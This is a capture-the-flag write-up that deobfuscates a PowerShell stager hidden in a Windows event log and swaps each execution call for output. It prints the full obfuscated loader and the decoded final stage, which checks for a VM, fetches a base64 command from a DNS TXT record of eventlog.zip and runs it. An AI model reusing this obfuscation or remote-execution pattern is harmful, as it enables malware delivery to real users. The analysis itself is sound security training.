# Texas Chain Massacre
## Ugh! One of our users was trying to install a Texas Chainsaw Massacre video game, and installed malware instead. Our EDR detected a rogue process reading and writing events to the Application event log. Luckily, it killed the process and everything seems fine, but we don't know what it was doing in the event log.The EVTX file is attached. Are you able to find anything malicious?

## Archive password: infected

A file is joined to the challenge

---


Let's download the file to begin! 

# First step

After extracting the archive we find a file named `Application Logs.evtx` which is a windows event log file.

Opening with the Windows event viewer won't help, you have to open it with your favourite text editor and scroll a bit into it. 

Finally, something caught my eye. 

```ps
!96%w)CNWindows Installer installed the product. Product Name: The Texas Chain Saw Massacre (1974). Product Version: 8.0.382.5. Product Language: English. Director: Tobe Hooper. Installation success or error status: 0.(('. ( ZT6ENv:CoMSpEc[4,24,'+'25]-joinhx6hx6)( a6T ZT6( Set-variaBle hx6OfShx6 hx6hx6)a6T+ ( [StriNg'+'] [rEGeX]::mAtcheS( a6T ))421]RAhC[,hx6fKIhx6eCALPeR-  93]RAhC[,)89]RAhC[+84]RAhC[+98]RAhC[( EcalPeRC-  63]RAhC[,hx6kwlhx6EcalPeRC-  )hx6)bhx6+hx60Yb0Yhx6+hx6niOj-]52,hx6+hx642,hx6+'+'hx64[cehx6+hx6phx6+hx6SMoC:Vnhx6+hx6ekwl ( hx6+hx6. fKI ) (DnEOTDAhx6+hx6ehx6+hx6r.)} ) hx6+'+'hx6iicsA:hx6+hx6:]GnidOcNhx6+hx6e.hx6+hx6Thx6+hx6xethx6+hx6.hx6+hx6METsys[hx6+hx6 ,_kwhx6+h'+'x6l (REDhx6+hx6AeRmaertS.o'+'Ihx6+hx6 thx6+hx6Chx6'+'+hx6ejbO-Wh'+'x6+hx6En { HCaERoFhx6+hx6fKI) sSERpM'+'oCehx6+hx'+'6dhx6+hx6::hx6+hx6]'+'edOMhx6+hx6'+'nOisSErPMochx6+hx6.NoISSerhx6+hx6pMOc.oi[, ) b'+'0Yhx6+hx6==wDyD4p+S'+'s/l/hx6+hx6i+5GtatJKyfNjOhx6+'+'hx63hx6+hx63hx6+hx64Vhx6+hx6vj6wRyRXe1xy1pB0hx6+hx6AXVLMgOwYhx6+hx6//hx6+hx6Womhx6+hx6z'+'zUhx6+hx6tBhx6+hx6sx/ie0rVZ7hx6+hx6xcLiowWMGEVjk7JMfxVmuszhx6+hx6OT3XkKu9TvOsrhx6+hx6bbhx6+hx6cbhx6+hx6GyZ6c/gYhx6+hx6Npilhx6+hx6BK7x5hx6+hx6Plchx6+hx68qUyOhBYhx6+hx6VecjNLW42YjM8SwtAhx6+hx6aR8Ihx6+hx6Ohx6+hx6whx6+hx6mhx6+hx66hx6+hx6UwWNmWzCw'+'hx6+hx6VrShx6+hx6r7Ihx6+hx6T2hx6+hx6k6Mj1Muhx6+hx6Khx6+hx6T'+'/oRhx6+hx6O5BKK8R3NhDhx6+hx6om2Ahx6+hx6GYphx6+hx6yahx6+hx6TaNg8DAneNoeSjhx6+h'+'x6ugkTBFTcCPaSH0QjpFywhx6+'+'hx6aQyhx'+'6+hx6HtPUG'+'hx'+'6+hx6DL0BK3hx6+h'+'x6lClrHAvhx6+h'+'x64GOpVKhx6+hx6UNhx6+hx6mGzIDeraEvlpc'+'kC9EGhx6+hx6gIaf96jSmShx6'+'+hx6Mhhx6+hx6hhx6+hx6RfI72hx6+hx6oHzUkDsZoT5hx6+hx6nhx6+hx6c7MD8W31Xq'+'Khx6+hx6d4dbthx6+hx6bth1RdSigEaEhx6+hx6JNERMLUxV'+'hx6+hx6ME4PJtUhx6+hx6tSIJUZfZhx6+hx6EEhx6+hx6Ahx6+hx6JsTdDZNbhx6+hx60Y(gniRTS4hx6+hx66esh'+'x6+hx6aBmoRF::]tRevnOhx6+hx6C[]MAertsYrOmeM.Oi.mETSYs[ (MaErhx6+hx6thx6+hx6sEtALfeD.NOhx6+hx6IsS'+'erPmo'+'c.OI.mehx6+hx6TsYShx6'+'+hx6 hx6+hx6 tCejbO-WEhx6+hx6n ( hx6(((no'+'IsseRpX'+'e-ekovni a6T,hx6.hx6,hx6RightToLEFthx6 ) RYcforEach{ZT6_ })+a6T ZT6( sV hx6oFshx6 hx6 hx6)a6T ) ')  -cREpLACE ([cHAr]90+[cHAr]84+[cHAr]54),[cHAr]36 -rEPlAce'a6T',[cHAr]34  -rEPlAce  'RYc',[cHAr]124 -cREpLACE  ([cHAr]104+[cHAr]120+[cHAr]54),[cHAr]39) |. ( $vERboSEpreFeRenCe.tOStrING()[1,3]+'x'-JOin'')7
```

Well well... 

# Deobfuscation: First step

Let's focus on the end of the file

Easy step: ``$vERboSEpreFeRenCe.tOStrING()[1,3]+'x'-JOin'')7`` is in reality just `iex` which is in powershell a command to execute code.

At first sight we see a big long string followed by `creplace()` and `-replace()`. Let's replace the char manually on those for better visibility:

- `-cREpLACE ([cHAr]90+[cHAr]84+[cHAr]54),[cHAr]36` == `-cREpLACE ("ZT6","$")`
- `-rEPlAce'a6T',[cHAr]34` == `-rEPlAce('a6T','"')`
- `-rEPlAce  'RYc',[cHAr]124` == `-rEPlAce  ('RYc','|')`
- `-cREpLACE  ([cHAr]104+[cHAr]120+[cHAr]54),[cHAr]39)` == `-cREpLACE  ("hx6","'")`

Let's tidy the first part of the file ("windows installer blabla") and keep the rest into a variable that I will name `$BigLongString`.


```ps
$BigLongString -cREpLACE ("ZT6","$") -rEPlAce('a6T','"')  -rEPlAce  ('RYc','|') -cREpLACE  ("hx6","'")
```

## Output

```ps
0.(('. ( $ENv:CoMSpEc[4,24,'+'25]-join'')( " $( Set-variaBle 'OfS' '')"+ ( [StriNg'+'] [rEGeX]::mAtcheS( " ))421]RAhC[,'fKI'eCALPeR-  93]RAhC[,)89]RAhC[+84]RAhC[+98]RAhC[( EcalPeRC-  63]RAhC[,'kwl'EcalPeRC-  )')b'+'0Yb0Y'+'niOj-]52,'+'42,'+'+''4[ce'+'p'+'SMoC:Vn'+'ekwl ( '+'. fKI ) (DnEOTDA'+'e'+'r.)} ) '+'+''iicsA:'+':]GnidOcN'+'e.'+'T'+'xet'+'.'+'METsys['+' ,_kw'+h'+'x6l (RED'+'AeRmaertS.o'+'I'+' t'+'C''+'+'ejbO-Wh'+'x6+'En { HCaERoF'+'fKI) sSERpM'+'oCe'+hx'+'6d'+'::'+']'+'edOM'+''+'nOisSErPMoc'+'.NoISSer'+'pMOc.oi[, ) b'+'0Y'+'==wDyD4p+S'+'s/l/'+'i+5GtatJKyfNjO'+'+''3'+'3'+'4V'+'vj6wRyRXe1xy1pB0'+'AXVLMgOwY'+'//'+'Wom'+'z'+'zU'+'tB'+'sx/ie0rVZ7'+'xcLiowWMGEVjk7JMfxVmusz'+'OT3XkKu9TvOsr'+'bb'+'cb'+'GyZ6c/gY'+'Npil'+'BK7x5'+'Plc'+'8qUyOhBY'+'VecjNLW42YjM8SwtA'+'aR8I'+'O'+'w'+'m'+'6'+'UwWNmWzCw'+''+'VrS'+'r7I'+'T2'+'k6Mj1Mu'+'K'+'T'+'/oR'+'O5BKK8R3NhD'+'om2A'+'GYp'+'ya'+'TaNg8DAneNoeSj'+h'+'x6ugkTBFTcCPaSH0QjpFyw'+'+''aQyhx'+'6+'HtPUG'+'hx'+'6+'DL0BK3'+h'+'x6lClrHAv'+h'+'x64GOpVK'+'UN'+'mGzIDeraEvlpc'+'kC9EG'+'gIaf96jSmS''+'+'Mh'+'h'+'RfI72'+'oHzUkDsZoT5'+'n'+'c7MD8W31Xq'+'K'+'d4dbt'+'bth1RdSigEaE'+'JNERMLUxV'+''+'ME4PJtU'+'tSIJUZfZ'+'EE'+'A'+'JsTdDZNb'+'0Y(gniRTS4'+'6esh'+'x6+'aBmoRF::]tRevnO'+'C[]MAertsYrOmeM.Oi.mETSYs[ (MaEr'+'t'+'sEtALfeD.NO'+'IsS'+'erPmo'+'c.OI.me'+'TsYS''+'+' '+' tCejbO-WE'+'n ( '(((no'+'IsseRpX'+'e-ekovni ",'.','RightToLEFt' ) |forEach{$_ })+" $( sV 'oFs' ' ')" ) ')
```

Much better! But not enough

# Deobfuscation: Second step

The first line is... yeah... "readable" but after that I can't seem to understand one word. Looking in detail I see that it is simply reversed. The function `RightToLeft` at the end of the file confirm that. Let's put the reversed part into CyberChef (starting from `421` until `e-ekovni`)

```ps
invoke-e'+'XpRessI'+'on(((' ( n'+'EW-ObjeCt '+' '+'+''SYsT'+'em.IO.c'+'omPre'+'SsI'+'ON.DefLAtEs'+'t'+'rEaM( [sYSTEm.iO.MemOrYstreAM][C'+'OnveRt]::FRomBa'+6x'+'hse6'+'4STRing(Y0'+'bNZDdTsJ'+'A'+'EE'+'ZfZUJISt'+'UtJP4EM'+''+'VxULMRENJ'+'EaEgiSdR1htb'+'tbd4d'+'K'+'qX13W8DM7c'+'n'+'5ToZsDkUzHo'+'27IfR'+'h'+'hM'+'+''SmSj69faIg'+'GE9Ck'+'cplvEareDIzGm'+'NU'+'KVpOG46x'+'h+'vAHrlCl6x'+'h+'3KB0LD'+6'+'xh'+'GUPtH'+6'+'xhyQa''+'+'wyFpjQ0HSaPCcTFBTkgu6x'+'h+'jSeoNenAD8gNaT'+'ay'+'pYG'+'A2mo'+'DhN3R8KKB5O'+'Ro/'+'T'+'K'+'uM1jM6k'+'2T'+'I7r'+'SrV'+''+'wCzWmNWwU'+'6'+'m'+'w'+'O'+'I8Ra'+'AtwS8MjY24WLNjceV'+'YBhOyUq8'+'clP'+'5x7KB'+'lipN'+'Yg/c6ZyG'+'bc'+'bb'+'rsOvT9uKkX3TO'+'zsumVxfMJ7kjVEGMWwoiLcx'+'7ZVr0ei/xs'+'Bt'+'Uz'+'z'+'moW'+'//'+'YwOgMLVXA'+'0Bp1yx1eXRyRw6jv'+'V4'+'3'+'3''+'+'OjNfyKJtatG5+i'+'/l/s'+'S+p4DyDw=='+'Y0'+'b ) ,[io.cOMp'+'reSSIoN.'+'coMPrESsiOn'+''+'MOde'+']'+'::'+'d6'+'xh+'eCo'+'MpRESs )IKf'+'FoREaCH { nE'+6x'+'hW-Obje'+'+''C'+'t '+'I'+'o.StreamReA'+'DER( l6x'+'h+'wk_, '+'[sysTEM'+'.'+'tex'+'T'+'.e'+'NcOdinG]:'+':Ascii''+'+' ) }).r'+'e'+'ADTOEnD( ) IKf .'+' ( lwke'+'nV:CoMS'+'p'+'ec[4''+'+',24'+',25]-jOin'+'Y0bY0'+'b)')  -CRePlacE'lwk',[ChAR]36  -CRePlacE ([ChAR]89+[ChAR]48+[ChAR]98),[ChAR]39  -RePLACe'IKf',[ChAR]124
```

Every step takes us to a more readable code! Let's continue.

A lot of string concatenation is in place here. Let's remove²    `'+'`.

## Output

```ps
invoke-eXpRessIon(((' ( nEW-ObjeCt  +''SYsTem.IO.comPreSsION.DefLAtEstrEaM( [sYSTEm.iO.MemOrYstreAM][COnveRt]::FRomBa'+6xhse64STRing(Y0bNZDdTsJAEEZfZUJIStUtJP4EMVxULMRENJEaEgiSdR1htbtbd4dKqX13W8DM7cn5ToZsDkUzHo27IfRhhM+''SmSj69faIgGE9CkcplvEareDIzGmNUKVpOG46xh+'vAHrlCl6xh+'3KB0LD'+6xhGUPtH'+6xhyQa'+'wyFpjQ0HSaPCcTFBTkgu6xh+'jSeoNenAD8gNaTaypYGA2moDhN3R8KKB5ORo/TKuM1jM6k2TI7rSrVwCzWmNWwU6mwOI8RaAtwS8MjY24WLNjceVYBhOyUq8clP5x7KBlipNYg/c6ZyGbcbbrsOvT9uKkX3TOzsumVxfMJ7kjVEGMWwoiLcx7ZVr0ei/xsBtUzzmoW//YwOgMLVXA0Bp1yx1eXRyRw6jvV433'+'OjNfyKJtatG5+i/l/sS+p4DyDw==Y0b ) ,[io.cOMpreSSIoN.coMPrESsiOnMOde]::d6xh+'eCoMpRESs )IKfFoREaCH { nE'+6xhW-Obje+''Ct Io.StreamReADER( l6xh+'wk_, [sysTEM.texT.eNcOdinG]::Ascii'+' ) }).reADTOEnD( ) IKf . ( lwkenV:CoMSpec[4'+',24,25]-jOinY0bY0b)')  -CRePlacE'lwk',[ChAR]36  -CRePlacE ([ChAR]89+[ChAR]48+[ChAR]98),[ChAR]39  -RePLACe'IKf',[ChAR]124
```

And we have replace and char again ! Let's focus on these :

- `-CRePlacE'lwk',[ChAR]36` == `-CRePlacE('lwk',"$")`
- `-CRePlacE ([ChAR]89+[ChAR]48+[ChAR]98),[ChAR]39` == `-CRePlacE (("Y0b"),"'")`
- `-RePLACe'IKf',[ChAR]124` == `-RePLACe('IKf',"|")`

Let's put all the rest into a $string and make this cmd :

```ps
$string -CRePlacE('lwk',"$")  -CRePlacE (("Y0b"),"'")  -RePLACe('IKf',"|")
```

## Output

```ps
0.(('. ( $ENv:CoMSpEc[4,24,25]-join'')( " $(
Set-variable 'OfS' '')"+ ( [String] [regex]::matches( " ))


invoke-eXpRessIon(((' ( nEW-ObjeCt  SYsTem.IO.comPreSsION.DefLAtEstrEaM( [sYSTEm.iO.MemOrYstreAM][COnveRt]::FRomBase64STRing('NZDdTsJAEEZfZUJIStUtJP4EMVxULMRENJEaEgiSdR1htbtbd4dKqX13W8DM7cn5ToZsDkUzHo27IfRhhMSmSj69faIgGE9CkcplvEareDIzGmNUKVpOG4vAHrlCl3KB0LDGUPtHyQawyFpjQ0HSaPCcTFBTkgujSeoNenAD8gNaTaypYGA2moDhN3R8KKB5ORo/TKuM1jM6k2TI7rSrVwCzWmNWwU6mwOI8RaAtwS8MjY24WLNjceVYBhOyUq8clP5x7KBlipNYg/c6ZyGbcbbrsOvT9uKkX3TOzsumVxfMJ7kjVEGMWwoiLcx7ZVr0ei/xsBtUzzmoW//YwOgMLVXA0Bp1yx1eXRyRw6jvV433OjNfyKJtatG5+i/l/sS+p4DyDw==' ) ,[io.cOMpreSSIoN.coMPrESsiOnMOde]::deCoMpRESs )|FoREaCH    
{
 nEW-ObjeCt Io.StreamReADER( $_, [sysTEM.texT.eNcOdinG]::Ascii ) }).reADTOEnD( ) | iex
```

Looks like we have something here ! 

Following this the script decodes from base64, decompress and then execute. Let's change `iex` and replace it by `Write-Output` to avoid executing a malware to my computer and mostly to see the output of the script !

```ps

$decompressedContent = ( nEW-ObjeCt  SYsTem.IO.comPreSsION.DefLAtEstrEaM( [sYSTEm.iO.MemOrYstreAM][COnveRt]::FRomBase64STRing('NZDdTsJAEEZfZUJIStUtJP4EMVxULMRENJEaEgiSdR1htbtbd4dKqX13W8DM7cn5ToZsDkUzHo27IfRhhMSmSj69faIgGE9CkcplvEareDIzGmNUKVpOG4vAHrlCl3KB0LDGUPtHyQawyFpjQ0HSaPCcTFBTkgujSeoNenAD8gNaTaypYGA2moDhN3R8KKB5ORo/TKuM1jM6k2TI7rSrVwCzWmNWwU6mwOI8RaAtwS8MjY24WLNjceVYBhOyUq8clP5x7KBlipNYg/c6ZyGbcbbrsOvT9uKkX3TOzsumVxfMJ7kjVEGMWwoiLcx7ZVr0ei/xsBtUzzmoW//YwOgMLVXA0Bp1yx1eXRyRw6jvV433OjNfyKJtatG5+i/l/sS+p4DyDw==' ) ,[io.cOMpreSSIoN.coMPrESsiOnMOde]::deCoMpRESs )|FoREaCH { nEW-ObjeCt Io.StreamReADER( $_, [sysTEM.texT.eNcOdinG]::Ascii ) }).reADTOEnD( )

$decompressedContent

```

## Output

```ps
try {
    $TGM8A = Get-WmiObject MSAcpi_ThermalZoneTemperature -Namespace "root/wmi" -ErrorAction 'silentlycontinue' ; 
    if ($error.Count -eq 0) { 
        $5GMLW = (Resolve-DnsName eventlog.zip -Type txt | ForEach-Object { 
            $_.Strings }); 
            if (
                $5GMLW -match '^[-A-Za-z0-9+/]*={0,3}$') { 
                    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($5GMLW)) | Invoke-Expression } } } catch { }
```

# Final step

Let's ignore the `try catch` and the `if` condition, replace the final `Invoke-Expression` with `Write-Host` and the flag will appear!

```ps
$5GMLW = (Resolve-DnsName eventlog.zip -Type txt | ForEach-Object { 
            $_.Strings }); 
            if (
                $5GMLW -match '^[-A-Za-z0-9+/]*={0,3}$') { 
                    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($5GMLW)) | Write-Host }
```